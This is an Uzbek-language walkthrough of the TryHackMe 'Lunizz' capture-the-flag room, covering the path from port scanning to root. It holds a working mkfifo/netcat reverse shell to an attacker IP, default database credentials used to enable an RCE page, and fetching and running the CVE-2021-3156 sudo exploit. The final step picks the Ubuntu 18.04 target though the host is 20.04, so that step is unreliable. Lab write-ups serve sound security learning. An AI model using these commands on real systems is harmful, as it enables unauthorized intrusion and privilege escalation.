# Lunizz CTF

Room: https://tryhackme.com/room/lunizzctfnd



# Razvetka

Portscanning...

Buyruq:

```
rustscan -a 10.201.41.130 -- -sV
```

Natija:

```
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
5000/tcp  open  tcpwrapped syn-ack
33060/tcp open  mysqlx     syn-ack MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



Routinglarga nazar solamiz:

Buyruq:

```
gobuster dir -u 10.201.41.130 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html,.txt
```

Natija:

```
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/hidden               (Status: 301) [Size: 315] [--> http://10.201.41.130/hidden/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
/whatever             (Status: 301) [Size: 317] [--> http://10.201.41.130/whatever/]
/instructions.txt
```

/hidden qismi:

![]()

Fayl yuklash mumkin ekan, reverse shell yuklashga urinib ko'ramiz.



/whatever qismi:

![]()

RCE bor ekan, lekin uni aktivlashtirish kerak.



/instructions.txt qismi:

```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```



Yaxshi endi mysqlga ulanamiz:

```
# mariadb -u runcheck -p -h 10.201.41.130 --skip-ssl

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 29
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Databaselarni ko'ramiz:

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+
3 rows in set (0.193 sec)

MySQL [(none)]> use runornot
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

**runornot** databaseni belgiladik endi tablelar ro'yxatini ko'ramiz.

```
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.200 sec)
```

Table tarkibi:

```
MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
1 row in set (0.320 sec)
```

RCE o'chirilgandi endi uni yoqamiz:

```
MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.208 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    1 |
+------+
1 row in set (0.188 sec)
```

/whatever qismini tekshiramiz.

![]()

Ishladi!



Reverse shell ochamiz o'zimizga:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.24.135 4444 >/tmp/f
```

Reverse shellni tutish uchun NetCatdan foydalanamiz:

```
nc -nvlp 4444
```

Oppa!
```
    nc -nvlp 4444
Connection from 10.201.41.130:46078
/bin/sh: 0: can't access tty; job control turned off
$ 
```

SHellni qulay xolatga keltiramiz.

```
script -qc /bin/bash /dev/null
```
```
export TERM=xterm
```

Odatiy bo'lmagan xolat:

```
www-data@ip-10-201-41-130:/$ ls
bin    etc	      lib	  mnt	 root	srv	 usr
boot   home	      lib64	  opt	 run	swap.img  var
cdrom  initrd.img      lost+found  proc   sbin	sys	 vmlinuz
dev    initrd.img.old  media	  proct  snap	tmp	 vmlinuz.old
www-data@ip-10-201-41-130:/$ ls /proct
pass
```

Tarkibi:

```
www-data@ip-10-201-41-130:/$ ls /proct/pass
bcrypt_encryption.py
```

bcrypt_encryption.py fayl tarkibi: 

```
www-data@ip-10-201-41-130:/proct/pass$ cat bcrypt_encryption.py
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()
```



Foydalanuvchilar ro'yxati:

```
www-data@ip-10-201-41-130:/home$ ls
adam  mason  ssm-user  ubuntu
```



Tizim versiyasi:

```
www-data@ip-10-201-41-130:/$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
www-data@ip-10-201-41-130:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.6 LTS
Release:	20.04
Codename:	focal
```

By gpt:

```
🧩 2. Sudo exploitlari (versiya bo‘yicha)
Sudo 1.8.31 da quyidagilarni tekshirib ko‘ring:

🔥 CVE-2021-3156 — Baron Samedit
Bu sudo versiyasi ushbu zaiflikdan ta'sirlangan bo'lishi mumkin. Bu zaiflik heap-based buffer overflow orqali sudo dan rootga chiqish imkonini beradi.
```

Exploit topildi!
Uni avval o'zimizga yuklab olib serverga jo'natamiz:

```
git clone https://github.com/blasty/CVE-2021-3156.git
```
```
sudo python3 -m http.server 80
```



Uni serverga yuklab olish:

```
cd /tmp
```

```
wget -r --no-parent 10.8.24.135/CVE-2021-3156
```

Exploitni ishga tayyorlaymiz:

```
cd CVE-2021-3156
```

```
make
```

 va natija:

```
www-data@ip-10-201-41-130:/tmp/CVE-2021-3156$ ls
ls
Makefile  README.md  brute.sh  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
```

Ishga tushiramiz:

```
www-data@ip-10-201-41-130:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich                
./sudo-hax-me-a-sandwich 

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Nishonni tanlab ishga tushiramiz:

```
./sudo-hax-me-a-sandwich 0
```

Root ga xush kebsiz)
